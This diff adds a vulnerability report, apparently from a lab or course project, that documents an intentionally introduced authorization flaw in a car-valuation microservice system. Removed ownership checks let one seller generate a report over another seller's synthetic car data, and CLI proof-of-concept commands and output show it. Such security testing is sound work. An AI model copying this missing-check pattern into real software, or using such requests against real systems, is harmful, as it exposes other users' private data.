@@ -1,0 +1,41 @@
+V4 - Composition vulnerability in the FR6 report flow (breaks T9)
+Date: 2026-10-18T17:11:02Z
+Commit: 405f0d6 + uncommitted changes in auth-gateway/app/main.py and car-service/app/authz.py
+Environment: docker compose, fresh seed. Logged in as alice (seller, owns car 1). Car 2 is bob's.
+
+Both ownership checks in the report GENERATION flow were removed:
+  - gateway POST /cars/{car_id}/reports no longer verifies the car before issuing the job token
+  - car-service accepts a job token when car_id matches, without checking that sub owns the car
+Each service assumes the other enforces ownership in generation; neither does.
+
+Control - alice cannot see bob's car 2 through a still-protected endpoint:
+$ python3 cli/carcli.py valuations list 2
+HTTP 404: Not found
+
+Exploit - alice requests a report for bob's car 2 (she does not own it):
+$ python3 cli/carcli.py reports request 2
+{
+  "job_id": "00741f16d6d848b68fc04d3d26cdbca7",
+  "car_id": 2,
+  "report_id": 1
+}
+
+The request succeeds. report-service used the job token to read bob's car and
+valuation and generated a report. Stored report inside the car-service container:
+$ docker compose exec car-service sqlite3 /data/car.db "SELECT id, car_id, content FROM reports"
+report 1 car_id 2 
+Valuation report for car 2
+Audi A4 (2018), 90000 km
+
+2026-01-15T12:00:00+00:00  140000 DKK  Synthetic valuation for bob's car.
+
+
+The report is generated over bob's car (Audi A4) and holds bob's valuation
+(140000 DKK), although alice does not own car 2. This is the composition breach:
+unauthorized report generation over another seller's data.
+
+Note on read-back: alice CANNOT fetch the report through the API:
+$ python3 cli/carcli.py reports show 1
+HTTP 404: Not found
+GET /reports/{id} and GET /cars/{id}/reports still enforce the SELLER ownership
+check, which was outside the V4 scope (only the JOB-token check was removed).
